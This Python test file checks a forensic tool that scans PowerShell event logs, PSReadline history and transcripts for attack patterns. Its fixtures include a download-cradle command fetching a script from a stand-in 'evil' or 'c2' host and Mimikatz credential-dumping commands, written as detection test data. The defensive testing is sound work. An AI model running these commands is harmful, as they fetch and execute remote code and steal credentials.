"""PowerShell breadth tests: EID 4103 module logging + PSReadline
history + transcription logs all routed through the same family
pattern library as the EID 4104 scanner from T2-2."""
import csv
from pathlib import Path

import pytest

from el.skills import powershell_triage as pst


_EVTX_COLS = [
    "RecordNumber", "EventRecordId", "TimeCreated", "EventId", "Level",
    "Provider", "Channel", "ProcessId", "ThreadId", "Computer",
    "ChunkNumber", "UserId", "MapDescription", "UserName", "RemoteHost",
    "PayloadData1", "PayloadData2", "PayloadData3", "PayloadData4",
    "PayloadData5", "PayloadData6", "SourceFile",
]


def _write_evtx(path: Path, rows: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=_EVTX_COLS)
        w.writeheader()
        for r in rows:
            w.writerow({c: r.get(c, "") for c in _EVTX_COLS})


# ---------------------------------------------------------------------------
# EID 4103 module-logging scan
# ---------------------------------------------------------------------------

def test_run_on_eid_4103_detects_mimikatz(tmp_path):
    p = tmp_path / "evtx.csv"
    _write_evtx(p, [
        {"EventId": "4103", "TimeCreated": "2024-01-01T10:00:00Z",
         "PayloadData2": "ScriptBlockText: Invoke-Mimikatz"},
    ])
    hits = pst.run_on_eid(p, {4103})
    assert any(h.family == "mimikatz" for h in hits)


def test_run_on_eid_4103_ignores_4104(tmp_path):
    """When we filter on {4103} only, 4104 events pass through untouched."""
    p = tmp_path / "evtx.csv"
    _write_evtx(p, [
        {"EventId": "4104", "TimeCreated": "2024-01-01T10:00:00Z",
         "PayloadData2": "ScriptBlockText: Invoke-Mimikatz"},
    ])
    hits = pst.run_on_eid(p, {4103})
    assert hits == []


def test_run_on_eid_multi_id(tmp_path):
    p = tmp_path / "evtx.csv"
    _write_evtx(p, [
        {"EventId": "4103", "TimeCreated": "2024-01-01T10:00:00Z",
         "PayloadData2": "ScriptBlockText: sekurlsa::logonpasswords"},
        {"EventId": "4104", "TimeCreated": "2024-01-01T10:01:00Z",
         "PayloadData2": "ScriptBlockText: Invoke-Mimikatz"},
    ])
    hits = pst.run_on_eid(p, {4103, 4104})
    mimi = [h for h in hits if h.family == "mimikatz"][0]
    assert mimi.event_count == 2


# ---------------------------------------------------------------------------
# run_on_text_file (PSReadline + transcription)
# ---------------------------------------------------------------------------

def test_run_on_text_file_matches_psreadline_content(tmp_path):
    p = tmp_path / "ConsoleHost_history.txt"
    p.write_text(
        "Get-Process\n"
        "IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')\n"
        "Import-Module ActiveDirectory\n"
        "Invoke-Mimikatz -DumpCreds\n"
    )
    hits = pst.run_on_text_file(p)
    families = {h.family for h in hits}
    assert "download_cradle" in families
    assert "mimikatz" in families


def test_run_on_text_file_counts_per_line(tmp_path):
    p = tmp_path / "history.txt"
    p.write_text(
        "Invoke-Mimikatz\n"
        "sekurlsa::logonpasswords\n"
        "Get-Process\n"
        "Invoke-Mimikatz -Command 'lsadump::sam'\n"
    )
    hits = pst.run_on_text_file(p)
    mimi = [h for h in hits if h.family == "mimikatz"][0]
    # Three matching commands
    assert mimi.event_count == 3


def test_run_on_text_file_missing_returns_empty(tmp_path):
    assert pst.run_on_text_file(tmp_path / "missing.txt") == []


def test_run_on_text_file_skips_comments_and_blanks(tmp_path):
    p = tmp_path / "h.txt"
    p.write_text("# comment\n\n\nGet-Process\n")
    # No malicious content → no hits
    assert pst.run_on_text_file(p) == []


def test_run_on_text_file_transcript_format(tmp_path):
    """PowerShell_transcript_*.txt files have header + commands +
    output interleaved. We scan line-by-line, so commands embedded
    anywhere in the file still match."""
    p = tmp_path / "PowerShell_transcript_HOST1.20240101.txt"
    p.write_text(
        "**********************\n"
        "Windows PowerShell transcript start\n"
        "Start time: 20240101100000\n"
        "**********************\n"
        "PS C:\\> IEX (New-Object Net.WebClient).DownloadString('http://c2/a')\n"
        "PS C:\\> Get-ChildItem\n"
    )
    hits = pst.run_on_text_file(p)
    assert any(h.family == "download_cradle" for h in hits)


# ---------------------------------------------------------------------------
# Agent wiring — EID 4103 + text files contribute to the same family findings
# ---------------------------------------------------------------------------

def _setup_ctx(tmp_path, monkeypatch, case_id):
    from el.agents.base import AgentContext
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "disk.E01"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id=case_id)
    with open_ledger(m.case_dir):
        pass
    return AgentContext(case_id=case_id, case_dir=Path(m.case_dir),
                        input_path=src, manifest=m.__dict__)


def test_agent_aggregates_4104_plus_4103_plus_text(tmp_path, monkeypatch):
    from el.agents.powershell_analyst import PowerShellAnalystAgent

    ctx = _setup_ctx(tmp_path, monkeypatch, "t-ps-breadth")
    csv_path = (Path(ctx.case_dir) / "analysis" / "windows_artifact"
                / "evtx" / "evtx_parsed.csv")
    _write_evtx(csv_path, [
        {"EventId": "4104", "TimeCreated": "2024-01-01T10:00:00Z",
         "PayloadData2": "ScriptBlockText: Invoke-Mimikatz"},
        {"EventId": "4103", "TimeCreated": "2024-01-01T10:05:00Z",
         "PayloadData2": "ScriptBlockText: sekurlsa::logonpasswords"},
    ])
    # PSReadline history with another mimikatz call
    ps_dir = Path(ctx.case_dir) / "exports" / "windows-artifacts" / "powershell"
    (ps_dir / "psreadline").mkdir(parents=True, exist_ok=True)
    (ps_dir / "psreadline" / "alice--ConsoleHost_history.txt").write_text(
        "Invoke-Mimikatz\n"
    )

    findings = PowerShellAnalystAgent().run(ctx)
    mimi_findings = [f for f in findings
                     if "[mimikatz]" in f.claim.lower()]
    assert mimi_findings
    # Event count should reflect 4104 (1) + 4103 (1) + text (1) = 3
    # via the summed-into-by_family aggregation. Agent claim includes
    # the number — parse it out to confirm the sum.
    assert "3 " in mimi_findings[0].claim.lower() or "3 s" in mimi_findings[0].claim.lower()


def test_agent_fires_when_only_text_file_has_signal(tmp_path, monkeypatch):
    """Host with no EVTX PowerShell signal but suspicious PSReadline
    history — we must still emit."""
    from el.agents.powershell_analyst import PowerShellAnalystAgent

    ctx = _setup_ctx(tmp_path, monkeypatch, "t-ps-txt-only")
    csv_path = (Path(ctx.case_dir) / "analysis" / "windows_artifact"
                / "evtx" / "evtx_parsed.csv")
    # Clean EVTX CSV — no 4104/4103 matches
    _write_evtx(csv_path, [
        {"EventId": "4104", "TimeCreated": "2024-01-01T10:00:00Z",
         "PayloadData2": "ScriptBlockText: Get-Process"},
    ])
    ps_dir = (Path(ctx.case_dir) / "exports" / "windows-artifacts"
               / "powershell" / "transcripts")
    ps_dir.mkdir(parents=True, exist_ok=True)
    (ps_dir / "alice--PowerShell_transcript.20240101.txt").write_text(
        "PS C:\\> Invoke-Mimikatz\n"
    )

    findings = PowerShellAnalystAgent().run(ctx)
    assert any("mimikatz" in f.claim.lower() for f in findings)
